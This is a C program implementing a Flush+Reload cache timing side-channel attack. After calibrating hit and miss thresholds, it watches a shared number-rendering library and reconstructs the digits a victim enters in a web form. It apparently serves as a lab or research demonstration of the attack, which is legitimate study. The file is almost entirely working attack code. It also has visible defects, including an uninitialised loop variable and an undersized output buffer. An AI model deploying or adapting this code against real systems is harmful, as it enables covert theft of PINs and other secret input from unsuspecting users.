#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include "probe.h"
#include "libnumberpic.h"

// can be overritten by a number in seconds as the first parameter
int DEFAULTPROBESEC = 60;

int main(int argc, char *argv[]) {
    

    int measure_c = 500;
    int measurements_flushed[measure_c][11];

    // access times when not used (from storage)
    for (int i = 0; i < measure_c; i++) {
        for (int j = 0; j < 10; j++) {
            measurements_flushed[i][j] = reload((char *) numbers[j+1]);
        }
        measurements_flushed[i][10] = reload((char *) &placenum);

        for (int j = 0; j < 10; j++) {
            flush((char *) numbers[j+1]);
        }
        flush((char *) &placenum);

        usleep(1);
    }

    // access times when accessed (from cache)
    int measurements[measure_c][11];
    for (int i = 0; i < measure_c; i++) {
        for (int j = 0; j < 10; j++) {
            measurements[i][j] = reload((char *) numbers[j+1]);
        }
        measurements[i][10] = reload((char *) &placenum);
        usleep(50);
    }

    // calculate tresholds
    int treshholds[11];

    for (int i = 0; i < 11; i++) {
        long sum = 0;
        for (int j = 0; j < measure_c; j++) {
            sum += measurements_flushed[j][i];
        }
        double avg_flush = sum / measure_c;
        
        sum = 0;
        for (int j = 0; j < measure_c; j++) {
            sum += measurements[j][i];
        }
        double avg = sum / measure_c;
        
        double th = (avg_flush + avg) / 2;
        treshholds[i] = th;

        printf("Number %i : %f\n", i, th);
        printf("%f     %f\n", avg_flush, avg);
    }

    int measures_nums[10];

    time_t start, curr, lastpn;
    time(&start);
    time(&lastpn);
    double diff;

    // guessed number
    char currnums[20] = ""; 
    int currnumsnext = 0;

    if(argc>1 && atoi(argv[1])) {
        DEFAULTPROBESEC = atoi(argv[1]);
    }

    // initial flush
    flush((char *) &placenum);
    for (int j = 0; j < 10; j++) {
        flush((char *) numbers[j+1]);
    }

    while (diff < DEFAULTPROBESEC) {
        int pnt = reload((char *) &placenum);
        if (pnt < treshholds[10]) {
            for (int j = 0; j < 10; j++) {
                measures_nums[j] = reload((char *) numbers[j+1]);
            }
        }

        flush((char *) &placenum);
        for (int j = 0; j < 10; j++) {
            flush((char *) numbers[j+1]);
        }

        // logging output to see accesses
        if (pnt < treshholds[10]) {
            
            char output[24+4*10] = "Access detected! digits: ";
            int pos = 25;
            
            for (int j = 0; j < 10; j++) {
                // measure each digit
                if (measures_nums[j] < treshholds[j]) {
                    pos += sprintf(&output[pos], " [%i]", j);
                }
            }
            printf("%s\n", output);

            time(&lastpn);
        }

        // examination of memory access times
        if (pnt < treshholds[10]) {

            // first number is just added (can be more if the first placenum was not detected but then order can not preserved)
            if (currnumsnext == 0) {
                for (int j = 0; j < 10; j++) {
                    if (measures_nums[j] < treshholds[j]) {
                        currnums[currnumsnext] = j + '0';
                        currnumsnext++;
                    }
                }
            } else {
                int currpos = currnumsnext;

                // adding all new numbers
                for (int j = 0; j < 10; j++) {
                    int nrnotused = 1;
                    for (int i = 0; i < currnumsnext; i++) {
                        if ((j + '0') == currnums[i]) {
                            nrnotused = 0;
                        }
                    }
                    if (nrnotused && measures_nums[j] < treshholds[j]) {
                        currnums[currnumsnext] = j + '0';
                        currnumsnext++;
                    }
                }

                // if no number was added there is a recurring number, in this case just the last number is used
                if (currpos == currnumsnext) {
                    currnums[currnumsnext] = currnums[currnumsnext-1];
                    currnumsnext++;
                }
            }

        }


        // detection of a new iteration of the web form
        time_t tmp;
        time(&tmp);
        double pndiff = difftime(tmp, lastpn);
        if (pndiff > 4) {
            currnums[currnumsnext] = '\0';
            printf("reset: %s\n", currnums);
            currnumsnext = 0;
            time(&lastpn); // reset after 4 seconds, also if no placenum call was detected
        }

        usleep(1);

        // calc time diff from start
        time(&curr);
        diff = difftime(curr, start);
    }
    
    return 0;
}
